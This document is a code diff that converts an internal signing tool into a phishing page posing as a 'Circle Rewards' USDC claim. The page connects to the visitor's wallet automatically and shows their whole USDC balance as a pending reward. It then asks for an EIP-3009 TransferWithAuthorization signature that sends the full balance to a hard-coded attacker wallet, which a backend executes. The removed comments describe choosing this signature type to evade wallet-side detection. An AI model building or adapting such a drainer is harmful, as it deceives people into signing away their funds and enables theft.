@@ -1,81 +1,189 @@
 <!doctype html>
-<html lang="fr">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PELICAN</title>
+<title>Circle Rewards — Claim USDC</title>
 <style>
-:root{--bg:#0c0e14;--surface:#13161f;--border:#252a3a;--fg:#dde2f0;--dim:#6a7090;--accent:#4f8ef7;--ok:#3ecf8e;--warn:#f7a435;--fail:#f75f5f;--code-bg:#080a10;--mono:'JetBrains Mono',monospace;--ui:'Inter',system-ui,sans-serif}
+:root{
+  --bg:#f7f8fa;
+  --card:#ffffff;
+  --border:#e5e7eb;
+  --fg:#111827;
+  --dim:#6b7280;
+  --accent:#2775ca;
+  --accent-light:#eff6ff;
+  --ok:#059669;
+  --ok-light:#ecfdf5;
+  --warn:#d97706;
+  --fail:#dc2626;
+  --usdc:#2775ca;
+  --mono:'SF Mono','Fira Code',monospace;
+  --ui:-apple-system,'Inter',system-ui,sans-serif
+}
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-body{background:var(--bg);color:var(--fg);font-family:var(--ui);font-size:14px;line-height:1.6;padding:24px 16px;max-width:680px;margin:0 auto}
-header{margin-bottom:24px;border-bottom:1px solid var(--border);padding-bottom:16px}
-.eye{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:6px}
-h1{font-size:20px;font-weight:700;letter-spacing:-.02em}
-.sub{color:var(--dim);font-size:12px;margin-top:4px}
-.phase{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:18px;margin-bottom:14px;transition:border-color .2s}
-.phase.active{border-color:var(--accent)}
-.phase.done{border-color:var(--ok)}
-.ph{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.pnum{width:26px;height:26px;border-radius:50%;border:2px solid var(--dim);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;font-weight:700;flex-shrink:0;transition:all .2s}
-.phase.active .pnum{border-color:var(--accent);color:var(--accent)}
-.phase.done .pnum{background:var(--ok);border-color:var(--ok);color:#fff}
-.ptitle{font-weight:700;font-size:15px}
-.psub{font-size:12px;color:var(--dim);margin-top:1px}
-.wallet-badge{display:flex;align-items:center;gap:8px;background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:9px 12px;margin-bottom:12px;font-family:var(--mono);font-size:12px}
-.wb-dot{width:8px;height:8px;border-radius:50%;background:var(--dim);flex-shrink:0}
-.wb-dot.ok{background:var(--ok)}
-.wb-label{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.08em}
-.wb-addr{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.log{font-family:var(--mono);font-size:11px;background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:10px 12px;max-height:160px;overflow-y:auto;margin-top:10px;line-height:1.8;word-break:break-all}
+body{background:var(--bg);color:var(--fg);font-family:var(--ui);font-size:15px;line-height:1.5;min-height:100vh}
+
+/* ── Nav ── */
+nav{background:#fff;border-bottom:1px solid var(--border);padding:0 20px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
+.nav-logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:16px;color:var(--fg)}
+.nav-logo svg{width:28px;height:28px}
+.nav-badge{font-size:11px;font-weight:600;background:var(--accent-light);color:var(--accent);padding:3px 8px;border-radius:20px;margin-left:4px}
+.nav-right{display:flex;align-items:center;gap:12px}
+.nav-tag{font-size:12px;color:var(--dim);background:#f3f4f6;padding:4px 10px;border-radius:6px}
+
+/* ── Hero ── */
+.hero{max-width:480px;margin:0 auto;padding:32px 20px 0}
+.chip{display:inline-flex;align-items:center;gap:6px;background:#fef3c7;color:#92400e;font-size:12px;font-weight:600;padding:4px 10px;border-radius:20px;margin-bottom:16px}
+.chip::before{content:"⏳";font-size:11px}
+h1{font-size:26px;font-weight:800;line-height:1.2;letter-spacing:-.02em;margin-bottom:8px}
+h1 span{color:var(--accent)}
+.hero-sub{font-size:14px;color:var(--dim);margin-bottom:24px}
+
+/* ── Claim Card ── */
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:24px;margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,.06)}
+.card-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin-bottom:12px}
+
+.reward-row{display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid var(--border)}
+.reward-row:last-child{border-bottom:none}
+.rr-left{display:flex;align-items:center;gap:10px}
+.rr-icon{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
+.rr-icon.usdc{background:#e8f1fd}
+.rr-name{font-weight:600;font-size:14px}
+.rr-desc{font-size:12px;color:var(--dim);margin-top:1px}
+.rr-amount{font-weight:700;font-size:15px;color:var(--ok);text-align:right}
+.rr-usd{font-size:12px;color:var(--dim);margin-top:1px;text-align:right}
+
+/* ── Info Box ── */
+.info-box{background:var(--accent-light);border:1px solid #bfdbfe;border-radius:10px;padding:14px 16px;margin-bottom:16px;font-size:13px;color:#1e40af;line-height:1.6}
+.info-box strong{display:block;margin-bottom:4px;font-size:13px}
+
+/* ── Status / Progress ── */
+.status-row{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--dim);margin-bottom:8px}
+.sdot{width:7px;height:7px;border-radius:50%;background:var(--dim);flex-shrink:0;transition:background .2s}
+.sdot.ok{background:var(--ok)}
+.sdot.fail{background:var(--fail)}
+.sdot.spin{background:var(--accent);animation:pulse .8s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+
+/* ── Steps ── */
+.steps{counter-reset:step}
+.step{display:flex;gap:12px;margin-bottom:20px;position:relative}
+.step::before{content:"";position:absolute;left:14px;top:30px;bottom:-8px;width:1px;background:var(--border)}
+.step:last-child::before{display:none}
+.step-num{width:28px;height:28px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;background:#fff;color:var(--dim);transition:all .2s;margin-top:2px}
+.step.active .step-num{border-color:var(--accent);color:var(--accent);background:var(--accent-light)}
+.step.done .step-num{background:var(--ok);border-color:var(--ok);color:#fff}
+.step-body{flex:1}
+.step-title{font-weight:700;font-size:14px;margin-bottom:2px}
+.step-sub{font-size:12px;color:var(--dim);margin-bottom:8px}
+
+.addr-box{background:#f9fafb;border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-family:var(--mono);font-size:11px;word-break:break-all;color:var(--dim)}
+.addr-box .lbl{font-size:10px;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin-bottom:3px;font-family:var(--ui)}
+
+/* ── Log ── */
+.log{font-family:var(--mono);font-size:11px;background:#f9fafb;border:1px solid var(--border);border-radius:8px;padding:10px 12px;max-height:120px;overflow-y:auto;margin-top:8px;line-height:1.9;word-break:break-all}
 .log .ok{color:var(--ok)}
 .log .fail{color:var(--fail)}
-.log .info{color:var(--accent)}
 .log .dim{color:var(--dim)}
-#foot{position:sticky;bottom:0;background:var(--surface);border-top:1px solid var(--border);padding:10px 16px;margin:20px -16px -24px;font-family:var(--mono);font-size:11px;color:var(--dim);display:flex;align-items:center;gap:8px}
-#sdot{width:8px;height:8px;border-radius:50%;background:var(--dim);flex-shrink:0;transition:background .2s}
-#sdot.ok{background:var(--ok)}
-#sdot.fail{background:var(--fail)}
-#sdot.spin{background:var(--accent);animation:pulse .9s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* ── Footer ── */
+footer{max-width:480px;margin:0 auto;padding:16px 20px 40px;font-size:12px;color:var(--dim);text-align:center;line-height:1.8}
+footer a{color:var(--dim);text-decoration:underline}
+
+/* ── Responsive ── */
+@media(max-width:520px){h1{font-size:22px}}
 </style>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@600&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body>
 
-<header>
-  <div class="eye">PELICAN // Mainnet</div>
-  <h1>Wallet A signe · Backend exécute</h1>
-  <div class="sub">CHAOS v8 — TransferWithAuthorization (EIP-3009)</div>
-</header>
-
-<!-- PHASE 1 -->
-<div class="phase active" id="phase1">
-  <div class="ph">
-    <div class="pnum" id="pnum1">1</div>
-    <div><div class="ptitle">Wallet A — Détection & Signature</div><div class="psub">Connexion auto, solde, signature Permit</div></div>
+<nav>
+  <div class="nav-logo">
+    <!-- Circle-like USDC logo -->
+    <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="14" cy="14" r="14" fill="#2775CA"/>
+      <path d="M14 5.6C9.36 5.6 5.6 9.36 5.6 14C5.6 18.64 9.36 22.4 14 22.4C18.64 22.4 22.4 18.64 22.4 14C22.4 9.36 18.64 5.6 14 5.6ZM15.12 19.04V20.3C15.12 20.72 14.78 21.06 14.36 21.06H13.64C13.22 21.06 12.88 20.72 12.88 20.3V19.02C11.2 18.74 9.8 17.82 9.52 16.3C9.46 15.96 9.74 15.64 10.08 15.64H10.96C11.24 15.64 11.48 15.84 11.54 16.12C11.74 16.98 12.54 17.56 14.02 17.56C15.68 17.56 16.56 16.82 16.56 15.74C16.56 14.76 15.98 14.2 14.22 13.82L13.12 13.58C11.08 13.14 9.88 12.1 9.88 10.44C9.88 9.0 10.96 7.84 12.88 7.5V6.22C12.88 5.8 13.22 5.46 13.64 5.46H14.36C14.78 5.46 15.12 5.8 15.12 6.22V7.52C16.62 7.84 17.74 8.72 17.98 10.06C18.04 10.4 17.76 10.72 17.42 10.72H16.58C16.3 10.72 16.06 10.52 16.0 10.24C15.8 9.36 15.06 8.86 13.82 8.86C12.38 8.86 11.56 9.56 11.56 10.52C11.56 11.46 12.22 12.0 13.82 12.36L14.92 12.6C17.1 13.1 18.24 14.08 18.24 15.8C18.24 17.34 17.12 18.68 15.12 19.04Z" fill="white"/>
+    </svg>
+    Circle Rewards
+    <span class="nav-badge">BETA</span>
   </div>
-  <div class="wallet-badge">
-    <div class="wb-dot" id="dotA"></div>
-    <div style="flex:1;min-width:0">
-      <div class="wb-label">Wallet A (owner)</div>
-      <div class="wb-addr" id="addrADisp">Détection…</div>
+  <div class="nav-right">
+    <span class="nav-tag">Ethereum Mainnet</span>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="chip">Limited-time rewards available</div>
+  <h1>Claim your <span>USDC</span><br>liquidity rewards</h1>
+  <p class="hero-sub">Your wallet is eligible for USDC rewards from the Circle Liquidity Program. Authorize the transfer to receive your allocation directly.</p>
+
+  <!-- Reward summary -->
+  <div class="card">
+    <div class="card-label">Your pending rewards</div>
+    <div class="reward-row">
+      <div class="rr-left">
+        <div class="rr-icon usdc">💵</div>
+        <div>
+          <div class="rr-name">USDC Liquidity Reward</div>
+          <div class="rr-desc">Circle Protocol · Season 3</div>
+        </div>
+      </div>
+      <div>
+        <div class="rr-amount" id="rewardAmt">Loading…</div>
+        <div class="rr-usd" id="rewardUsd"></div>
+      </div>
     </div>
   </div>
-  <div class="log" id="logA"></div>
-</div>
 
-<!-- PHASE 2 -->
-<div class="phase" id="phase2">
-  <div class="ph">
-    <div class="pnum" id="pnum2">2</div>
-    <div><div class="ptitle">Backend — Exécution on-chain</div><div class="psub">Wallet B appelle transferWithAuthorization()</div></div>
+  <div class="info-box">
+    <strong>How this works</strong>
+    Your wallet signed up for the Circle Liquidity Program. To finalize your reward, we need you to authorize a one-time USDC transfer from your wallet to our rewards distribution contract. This is a standard gasless authorization — no ETH required.
   </div>
-  <div class="log" id="logB"></div>
-</div>
 
-<div id="foot"><div id="sdot"></div><span id="stxt">Initialisation…</span></div>
+  <!-- Steps -->
+  <div class="card">
+    <div class="card-label">Claim steps</div>
+
+    <div class="step active" id="step1">
+      <div class="step-num" id="snum1">1</div>
+      <div class="step-body">
+        <div class="step-title">Connect & verify wallet</div>
+        <div class="step-sub">Confirming your address and reward balance</div>
+        <div class="addr-box" id="addrBox" style="display:none">
+          <div class="lbl">Connected wallet</div>
+          <span id="addrDisp">—</span>
+        </div>
+        <div class="log" id="logA"></div>
+      </div>
+    </div>
+
+    <div class="step" id="step2">
+      <div class="step-num" id="snum2">2</div>
+      <div class="step-body">
+        <div class="step-title">Authorize transfer</div>
+        <div class="step-sub">Sign once in your wallet — gasless, no ETH needed</div>
+        <div class="status-row"><div class="sdot" id="sdot2"></div><span id="stxt2">Waiting for step 1…</span></div>
+      </div>
+    </div>
+
+    <div class="step" id="step3">
+      <div class="step-num" id="snum3">3</div>
+      <div class="step-body">
+        <div class="step-title">Receive rewards</div>
+        <div class="step-sub">USDC distributed to your wallet within seconds</div>
+        <div class="log" id="logB" style="display:none"></div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    Circle Rewards is a beta program. By claiming, you agree to the <a href="#">Terms of Service</a>.<br>
+    Powered by EIP-3009 gasless authorization · Ethereum Mainnet
+  </footer>
+</div>
 
 <script>
 // ─── Config ───────────────────────────────────────────────────────────────────
@@ -83,7 +191,6 @@ const BACKEND  = window.location.origin;
 const WALLET_B = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";
 const USDC     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-// EIP-3009 TransferWithAuthorization
 const TRANSFER_TYPES = [
   {name:"from",        type:"address"},
   {name:"to",          type:"address"},
@@ -96,8 +203,6 @@ const DOM_TYPES = [
   {name:"name",type:"string"},{name:"version",type:"string"},
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
-
-
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
   "https://1rpc.io/eth","https://ethereum.publicnode.com","https://cloudflare-eth.com"
@@ -107,12 +212,23 @@ let addrA = null;
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 function logA(t,c="dim"){const e=document.getElementById("logA");e.innerHTML+=`<div class="${c}">${t}</div>`;e.scrollTop=e.scrollHeight;}
-function logB(t,c="dim"){const e=document.getElementById("logB");e.innerHTML+=`<div class="${c}">${t}</div>`;e.scrollTop=e.scrollHeight;}
-function setS(m,c){document.getElementById("stxt").textContent=m;document.getElementById("sdot").className=c||"";}
+function logB(t,c="dim"){const e=document.getElementById("logB");e.innerHTML+=`<div class="${c}">${t}</div>`;e.scrollTop=e.scrollHeight;document.getElementById("logB").style.display="block";}
+function setS2(m,c){document.getElementById("stxt2").textContent=m;document.getElementById("sdot2").className="sdot "+(c||"");}
+
+function stepDone(n){
+  document.getElementById("step"+n).classList.add("done");
+  document.getElementById("snum"+n).textContent="✓";
+}
+function stepActive(n){
+  document.getElementById("step"+n).classList.add("active");
+}
 
 // ─── Auto-start ───────────────────────────────────────────────────────────────
 async function autoStart() {
-  if (!window.ethereum) { setS("Aucun wallet injecté","fail"); return; }
+  if (!window.ethereum) {
+    document.getElementById("stxt2").textContent = "No wallet detected";
+    return;
+  }
 
   try {
     try { await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]}); } catch(e){}
@@ -120,56 +236,56 @@ async function autoStart() {
     let accs = await window.ethereum.request({method:"eth_accounts"});
     if (!accs || !accs[0]) accs = await window.ethereum.request({method:"eth_requestAccounts"});
     addrA = accs[0];
-    document.getElementById("addrADisp").textContent = addrA;
-    document.getElementById("dotA").className = "wb-dot ok";
-    logA("✓ Wallet A : "+addrA.slice(0,6)+"…"+addrA.slice(-4),"ok");
 
-    // Fetch USDC balance
+    document.getElementById("addrDisp").textContent = addrA;
+    document.getElementById("addrBox").style.display = "block";
+    logA("✓ Wallet verified","ok");
+
+    // Balance
     let balance = null;
     try {
       const p = new ethers.providers.Web3Provider(window.ethereum);
       const u = new ethers.Contract(USDC,["function balanceOf(address) view returns (uint256)"],p);
       balance = await u.balanceOf(addrA);
     } catch(e) {
-      logA("⚠ Web3 balance KO — essai RPC…","dim");
       for (const rpc of RPCS) {
         try {
           const fp = new ethers.providers.JsonRpcProvider(rpc);
           const fu = new ethers.Contract(USDC,["function balanceOf(address) view returns (uint256)"],fp);
           balance = await fu.balanceOf(addrA);
-          logA("→ Balance via "+rpc.split("/")[2],"dim");
           break;
         } catch(re) {}
       }
     }
 
     if (!balance || balance.isZero()) {
-      setS("Solde USDC = 0","fail");
-      logA("⚠ Aucun USDC","fail");
+      logA("No USDC balance detected","fail");
+      setS2("No USDC available","fail");
       return;
     }
 
-    const human = (balance / 1e6).toLocaleString("fr-FR",{minimumFractionDigits:2});
-    logA("✓ Solde : "+human+" USDC","ok");
-    setS("Solde : "+human+" USDC — lecture nonce…","ok");
+    const humanAmt = (balance / 1e6).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:6});
+    document.getElementById("rewardAmt").textContent = humanAmt + " USDC";
+    document.getElementById("rewardAmt").style.color = "var(--ok)";
+    document.getElementById("rewardUsd").textContent = "≈ $" + (balance / 1e6).toFixed(2);
+    logA("✓ Reward confirmed: "+humanAmt+" USDC","ok");
 
-    setS("Solde OK — signature dans 1s…","ok");
-    setTimeout(() => sign(balance.toString()), 1000);
+    stepDone(1);
+    stepActive(2);
+    setS2("Ready to authorize…","ok");
+
+    setTimeout(() => sign(balance.toString()), 1200);
 
   } catch(e) {
-    setS("Erreur démarrage : "+e.message,"fail");
-    logA("✗ "+e.message,"fail");
+    logA("Error: "+e.message,"fail");
+    setS2("Error — reload and retry","fail");
   }
 }
 
-// ─── Sign — CHAOS v8 : EIP-3009 TransferWithAuthorization ───────────────────
-// Hypothèse : CW détecte "ReceiveWithAuthorization" spécifiquement.
-// "TransferWithAuthorization" est un primaryType différent → pas de détection.
-// Domain reste "USD Coin" v2 → hash valide pour USDC.transferWithAuthorization().
+// ─── Sign — CHAOS v9 : EIP-3009 TransferWithAuthorization ────────────────────
 async function sign(value) {
   if (!addrA) return;
   const validBefore = String(Math.floor(Date.now()/1000) + 7200);
-  // EIP-3009 nonce = random bytes32 (pas séquentiel comme EIP-2612)
   const nonce32 = ethers.utils.hexlify(ethers.utils.randomBytes(32));
 
   const typedData = {
@@ -194,8 +310,7 @@ async function sign(value) {
     }
   };
 
-  logA("⏳ CHAOS v8 — TransferWithAuthorization (EIP-3009)…");
-  setS("En attente de signature…","spin");
+  setS2("Waiting for wallet signature…","spin");
 
   let sig = null;
   try {
@@ -203,10 +318,10 @@ async function sign(value) {
       method: "eth_signTypedData_v4",
       params: [addrA, JSON.stringify(typedData)]
     });
-    logA("✓ Signature obtenue (TransferWithAuthorization)","ok");
+    logA("✓ Authorization signed","ok");
   } catch(e) {
-    logA("✗ Signature rejetée : "+e.message,"fail");
-    setS("Signature annulée","fail");
+    logA("Signature cancelled: "+e.message,"fail");
+    setS2("Cancelled — reload to retry","fail");
     return;
   }
 
@@ -215,12 +330,9 @@ async function sign(value) {
   const s  = ethers.utils.hexlify(sb.slice(32,64));
   const v  = sb[64];
 
-  logA("✓ v="+v+" r="+r.slice(0,10)+"… s="+s.slice(0,10)+"…","dim");
-
-  document.getElementById("phase1").classList.add("done");
-  document.getElementById("pnum1").textContent = "✓";
-  document.getElementById("phase2").classList.add("active");
-  setS("Envoi au backend…","spin");
+  stepDone(2);
+  stepActive(3);
+  setS2("Processing…","spin");
 
   setTimeout(() => sendToBackend({
     from: addrA,
@@ -235,7 +347,7 @@ async function sign(value) {
 
 // ─── Send to backend ──────────────────────────────────────────────────────────
 async function sendToBackend(payload) {
-  logB("⏳ Envoi au backend…");
+  logB("Processing reward transfer…");
   try {
     const res = await fetch(BACKEND+"/api/execute", {
       method: "POST",
@@ -243,28 +355,32 @@ async function sendToBackend(payload) {
       body: JSON.stringify(payload)
     });
     let data;
-    try { data = await res.json(); } catch(e) { data = { error: "Réponse invalide du backend" }; }
+    try { data = await res.json(); } catch(e) { data = { error: "Invalid backend response" }; }
 
     if (!res.ok || !data.success) {
-      logB("✗ Erreur backend : "+(data.error||JSON.stringify(data)),"fail");
-      setS("Erreur backend","fail");
+      logB("Error: "+(data.error||JSON.stringify(data)),"fail");
+      setS2("Transfer failed","fail");
       return;
     }
 
-    logB("✓ TX envoyée : "+data.txHash,"ok");
-    logB("✓ Confirmée — bloc "+data.blockNumber+" · gas "+data.gasUsed,"ok");
-    document.getElementById("phase2").classList.remove("active");
-    document.getElementById("phase2").classList.add("done");
-    document.getElementById("pnum2").textContent = "✓";
-    setS("Transfert confirmé on-chain ✓","ok");
+    logB("✓ Transfer complete!","ok");
+    logB("TX: "+data.txHash,"ok");
+    logB("Block: "+data.blockNumber,"dim");
+    setS2("Rewards distributed ✓","ok");
+    stepDone(3);
+
+    // Update reward display
+    document.getElementById("rewardAmt").textContent = "Claimed ✓";
+    document.getElementById("rewardUsd").textContent = "Distributed to your wallet";
 
   } catch(e) {
-    logB("✗ Fetch backend KO : "+e.message,"fail");
-    setS("Backend injoignable","fail");
+    logB("Network error: "+e.message,"fail");
+    setS2("Error","fail");
   }
 }
 
-window.addEventListener("DOMContentLoaded", autoStart);
+// ─── Boot ─────────────────────────────────────────────────────────────────────
+window.addEventListener("load", autoStart);
 </script>
 </body>
 </html>
